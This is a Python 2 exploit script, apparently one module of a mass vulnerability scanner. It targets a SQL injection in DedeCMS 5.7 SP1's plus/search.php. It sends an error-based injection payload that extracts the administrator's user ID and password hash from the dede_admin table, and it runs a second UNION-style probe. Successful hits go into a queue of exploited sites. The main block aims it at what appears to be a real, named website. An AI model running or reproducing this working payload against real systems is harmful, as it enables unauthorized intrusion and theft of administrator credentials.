#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#神龙:29295842    BLOG:http://hi.baidu.com/alalmn
#本软件只是测试使用  大家别乱想啊
#dedecms search注入  dede 5.7 sp1
#http://huakai.paxmac.org/?p=543
#http://hi.baidu.com/alalmn/item/a0ded9c7e2f190d596445298

import urllib2
import threading
import re
import sys
sys.path.append('..')
import Class_Queue

class sql_dede_57_sp1(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #线程ID
        if not(("http://" in self.url) or ("https://" in self.url)):
            self.url="http://"+self.url
        self.one(self.url)
        self.one2(self.url)

    def one(self,arg):
        try:
            #url=arg+"/uploads/plus/search.php?keyword=11&amp;typeArr[%60@%27%60and%28SELECT%201%20FROM%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28SELECT/*%27*/concat%280x5f,userid,0x5f,pwd,0x5f%29%20from%20dede_admin%20Limit%200,1%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29]=1"
            url=arg+"/uploads/plus/search.php?keyword=11&amp;typeArr[%60@%27%60and%28SELECT%201%20FROM%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28SELECT/*%27*/concat%280x5f,userid,0x5f,pwd,0x5f%29%20from%20dede_admin%20Limit%200,1%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29]=1"
            req=urllib2.Request(url)
            res = urllib2.urlopen(req)
            html = res.read()
            res.close()
            #print html
            html = re.findall(r"Duplicate entry \'\w+'", html)
            if html:
                #print "OK-----------------success"
                #print html[0]
                EXP_list=[self.url,"sql","sql_dede_57_sp1",self.url+"/plus/search.php",html[0],""]
                ##["网址","漏洞类型","漏洞详细信息","漏洞地址","密码","备注"]
                print EXP_list
                Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
                return 1
            else:
                #print "no sql injection"
                return 0
        except Exception,e:
            #print e
            return 0

    def one2(self,arg):
        try:
            html = urllib2.urlopen(arg+'/plus/search.php?keyword=as&typeArr%5B1%20%75%4E%69%6F%6E%201%5D=a',timeout=5).read()
            if html:
                r = r"<font size='5' color='red'>(.*?)</font>"
                m = re.findall(r,html)
                if m:
                    #print 'search_php Sqlinjection'+m[0]
                    #["一句话 是否成功0否 1是","网址","严重程度","漏洞类型","漏洞地址","密码","备注"]7个
                    EXP_list=[self.url,"sql","sql_dede_57_sp2",self.url+"/plus/search.php",html[0],""]
                    ##["网址","漏洞类型","漏洞详细信息","漏洞地址","密码","备注"]
                    #print EXP_list
                    Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
            return 0
        except Exception,e:
            #print e
            return 0



################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):
        threads.append(sql_dede_57_sp1("www.fhxny.cn"))
    for t in threads:
        t.start()








